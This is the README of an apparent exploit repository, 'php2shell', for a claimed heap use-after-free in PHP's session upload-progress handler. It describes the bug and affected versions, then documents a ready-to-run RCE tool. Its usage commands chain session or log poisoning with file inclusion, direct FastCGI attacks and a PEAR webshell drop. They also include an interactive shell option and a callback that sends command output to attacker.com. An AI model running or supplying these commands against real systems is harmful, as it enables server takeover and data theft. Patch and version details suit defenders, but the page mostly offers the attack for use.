<!-- GitAds-Verify: M6GZ4VLQ7VQKZG9AG2DO6O2M5IN4JO1Z -->
# php2shell — CVE-2026-109618 / CVE-2026-109619 PoC

> **Heap Use-After-Free in PHP `session.upload_progress`**  
> CVSS 9.2 · PHP 5.4.0 – 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11



---

## Vulnerability

PHP's `ext/session/session.c` rfc1867 upload-progress handler caches raw `zval*` pointers into the session HashTable (`arData`) at lines 3292 and 3318. When a multipart upload stalls longer than `session.upload_progress.min_freq` (default 1 s), a second `FILE_DATA` event triggers `php_session_rfc1867_update()` → `php_session_initialize()` → `php_session_track_init()`, which **frees the HashTable** (lines 236–252). The cached pointers now reference freed `arData` slots. The next write at lines 3331–3332 (a `ZVAL_LONG` that stores `bytes_processed`) writes through those stale pointers — a classic heap use-after-free.

### Affected versions

| Branch | Vulnerable through | Fixed in |
|--------|-------------------|---------|
| PHP 8.2 | 8.2.34 | **8.2.35** |
| PHP 8.3 | 8.3.35 | **8.3.36** |
| PHP 8.4 | 8.4.26 | **8.4.27** |
| PHP 8.5 | 8.5.11 | **8.5.12** |
| PHP ≤ 8.1 | all | no backport — EOL |

## RCE Exploit (`poc.py`)

Full exploit chain with multiple fallback paths. Requires a PHP web application running a vulnerable PHP version.

### Usage

```bash
python3 poc.py <url> <command> [OPTIONS]

# Session poison + auto-detected LFI
python3 poc.py http://target.example.com/index.php "id"

# Specify LFI parameter
python3 poc.py http://target.example.com/ "id" --lfi-param page

# Interactive shell
python3 poc.py http://target.example.com/ "id" -i

# Blind callback (no LFI needed on target side)
python3 poc.py http://target.example.com/ "id" --callback http://attacker.com/
```

### Exploit chain (ordered by reliability)

| Stage | Method | Requirements |
|-------|--------|-------------|
| 1 | Session poison + LFI | App has `include($_GET[...])` or similar |
| 2 | Log poisoning + LFI | Apache/nginx write access log readable via LFI |
| 3 | FastCGI direct (no LFI) | php-fpm port reachable (9000–9003) |
| 4 | PEAR webshell drop | `/usr/share/php/pearcmd.php` accessible |

### Options

```
positional:
  url                    Target URL
  command                Command to execute

optional:
  --lfi-param PARAM      Known LFI parameter name (auto-discovered if omitted)
  --rounds N             Upload rounds per attempt (default: 3)
  --chunk-size N         Upload chunk size in bytes (default: 128)
  --chunk-delay SEC      Delay between chunks (default: 0.01)
  --modes {session,log,fastcgi,pear}  Comma-separated mode list (default: all)
  --probe-only           Only check if target is vulnerable, don't exploit
  --no-verify            Skip SSL certificate verification
  --cafile FILE          CA certificate file for SSL verification
  -i, --interactive      Drop to interactive shell on success
  --callback URL         Blind callback URL (exfiltrate output via HTTP)
```

### Lab (Apache + LFI)

```bash
cd lab
docker compose up -d --build

python3 ../poc.py http://localhost:8888/index.php "id" \
    --lfi-param page \
    --chunk-delay 0.01 \
    --chunk-size 128
```

Expected:

```
[+] RCE confirmed via session+LFI
COMMAND OUTPUT: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## References

- CVE-2026-109618 — `post_bytes_processed` stale pointer (session.c:3292)
- CVE-2026-109619 — `current_file_bytes_processed` stale pointer (session.c:3318)
- PHP bug tracker: bugs.php.net (patch committed 2026-09)
- Original research: Ahmed Sultan (0x4148) — jackalsyn.com/posts/php-up-2026.html

---

## Legal

This code is for authorized security testing, research, and education only. The authors are not responsible for any unauthorized use. Run this only against systems you own or have explicit written permission to test.



